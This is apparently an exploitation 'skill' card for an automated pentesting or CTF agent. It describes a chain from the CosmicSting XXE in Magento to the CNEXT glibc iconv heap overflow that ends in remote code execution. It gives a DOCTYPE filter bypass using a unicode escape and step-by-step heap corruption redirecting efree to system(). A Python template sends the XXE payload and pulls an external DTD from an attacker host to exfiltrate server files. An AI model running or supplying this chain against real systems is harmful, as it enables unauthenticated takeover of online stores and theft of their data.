---
name: magento_cosmicsting_xxe_cnext_rce
vuln_type: rce
sub_technique: xxe_to_rce_chain
category: exploitation
safety_level: safe
---

# Magento Cosmicsting Xxe + Cnext Glibc Iconv Heap Overflow → Rce

## When to Apply

Magento 2.4.7 or earlier is running with PHP 8.x on a glibc version vulnerable to CVE-2024-2961 (e.g., glibc 2.35-0ubuntu3). The REST API endpoint `/rest/all/V1/guest-carts/<id>/estimate-shipping-methods` processes XML data from the `sourceData.data` field without proper XXE protection (CVE-2024-34102). If a WAF or application-level filter blocks the literal string 'DOCTYPE', it can be bypassed via JSON unicode escapes (e.g., `\u0044OCTYPE`). The XXE provides a file-read primitive, which is then chained with CVE-2024-2961 (iconv buffer overflow in UTF-8 → ISO-2022-CN-EXT conversion) via php://filter chains to achieve RCE.

## Prerequisites

- Magento <= 2.4.7 with CVE-2024-34102 (CosmicSting XXE)
- glibc vulnerable to CVE-2024-2961 (iconv buffer overflow)
- PHP 8.x with zlib and iconv extensions enabled
- Attacker-controlled HTTP server reachable from the Magento server (for XXE OOB exfil)
- php://filter, data://, and zlib.inflate wrappers available

## Steps

1. Identify Magento version (2.4.7): check `/magento_version` or response headers
2. Identify glibc version via XXE file read of `/proc/self/maps` or package info
3. Set up attacker HTTP server to receive XXE OOB exfiltration
4. Send XXE payload via POST to `/rest/all/V1/guest-carts/test/estimate-shipping-methods`
5. Bypass DOCTYPE filter: use `\u0044OCTYPE` in JSON body instead of `DOCTYPE`
6. XXE reads files via `php://filter/convert.base64-encode/resource=<path>`
7. Read `/proc/self/maps` to get heap base address and libc path/address
8. Download libc binary to extract symbol offsets (system, malloc, realloc)
9. Build CNEXT exploit php://filter chain:
   - Heap spray with zlib.inflate + dechunk + iconv filters
   - Trigger iconv overflow (UTF-8 → ISO-2022-CN-EXT) with '劄' character
   - Corrupt zend_mm_heap free_slot and custom_heap pointers
   - Redirect efree → system() with command as chunk data
10. Send the crafted filter chain via XXE → RCE achieved
11. Execute SUID `/readflag` or read `/flag` directly

## Code Template

```
import json, requests\n# Magento CosmicSting XXE with DOCTYPE bypass\njson_data = {\n    'address': {'totalsReader': {'collectorList': {'totalCollector': {\n        'sourceData': {\n            'data': '<?xml version=\"1.0\" ?> <!DOCTYPE r [ <!ELEMENT r ANY >\n                <!ENTITY % sp SYSTEM \"http://attacker/file/BASE64_PATH\"> %sp;\n                %param1; ]> <r>&exfil;</r>',\n            'options': 524290,\n        }\n    }}}}\n}\n# Bypass DOCTYPE filter with unicode escape\npayload = json.dumps(json_data).replace('DOCTYPE', '\\u0044OCTYPE')\nr = requests.post(f'{url}/rest/all/V1/guest-carts/test/estimate-shipping-methods',\n    data=payload, headers={'Content-Type': 'application/json'})
```

## Examples

### Example 1

- **magento_version**: 2.4.7
- **glibc_version**: 2.35-0ubuntu3 (vulnerable to CVE-2024-2961)
- **php_version**: 8.1
- **xxe_endpoint**: /rest/all/V1/guest-carts/test/estimate-shipping-methods
- **filter_bypass**: \u0044OCTYPE in JSON body bypasses strpos($input, 'DOCTYPE')
- **iconv_trigger**: UTF-8 → ISO-2022-CN-EXT with '劄' char causes 1-byte heap overflow
- **rce_method**: Overwrite zend_mm_heap custom_heap.efree → __libc_system

CVE-2024-34102 (CosmicSting) is a critical Magento XXE that requires no authentication. CVE-2024-2961 (CNEXT) is a glibc iconv buffer overflow exploitable via PHP filter chains. The combo was first published by @cfreal_ (LEXFO/AMBIONICS). The DOCTYPE filter bypass using JSON unicode escapes is a common WAF evasion technique. The exploit uses the `kill -9 $PPID` pattern to prevent multiple system() calls with random data.
